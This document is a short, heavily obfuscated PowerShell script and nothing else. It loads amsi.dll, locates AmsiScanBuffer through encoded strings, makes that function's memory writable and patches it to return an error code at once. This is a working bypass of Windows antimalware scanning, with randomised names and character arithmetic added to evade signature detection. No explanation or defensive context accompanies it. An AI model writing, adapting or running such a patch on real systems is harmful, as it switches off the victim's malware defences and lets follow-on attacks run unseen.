$A7vh8I7Bc_y = @"
using System;
using System.Runtime.InteropServices;
public class A7vh8I7Bc_y {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr X4hNsIPZ_UzaGkv1ohj, string Yu70d_MA5avM);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr nu69ti, UIntPtr xRJKmcS8Yxo, uint WtADKabmU1DdbPsCou6, out uint y0aPFoapm94Sk1Ny);
}
"@

Add-Type $A7vh8I7Bc_y

$D2n0aKc = [A7vh8I7Bc_y]::LoadLibrary("$([chAR](97+7-7)+[ChAr]([ByTE]0x6d)+[CHar]([ByTe]0x73)+[CHar]([BYtE]0x69)+[ChAr](46*3/3)+[char](100*74/74)+[ChAR](108+36-36)+[CHaR]([byTe]0x6c))")
$_sN = [A7vh8I7Bc_y]::GetProcAddress($D2n0aKc, "$(('ÀmsíS'+'cãnBù'+'ffêr').nOrMaLizE([CHaR](70*65/65)+[chaR](111+44-44)+[ChAr](114+48-48)+[char](109)+[chaR](40+28)) -replace [ChAr](8+84)+[cHAR]([byte]0x70)+[chAR](123)+[ChAR]([BYTe]0x4d)+[cHaR](110+20-20)+[CHAR](125+108-108))")
$p = 0
[A7vh8I7Bc_y]::VirtualProtect($_sN, [uint32]5, 0x40, [ref]$p)
$Oq_I68Pt_meR = "0xB8"
$oeX = "0x57"
$RJPDJtV = "0x00"
$x7a108GdBH98b9g2WHJ = "0x07"
$ZCc = "0x80"
$QYeqltpIyh1 = "0xC3"
$bUFUi = [Byte[]] ($Oq_I68Pt_meR,$oeX,$RJPDJtV,$x7a108GdBH98b9g2WHJ,+$ZCc,+$QYeqltpIyh1)
[System.Runtime.InteropServices.Marshal]::Copy($bUFUi, 0, $_sN, 6)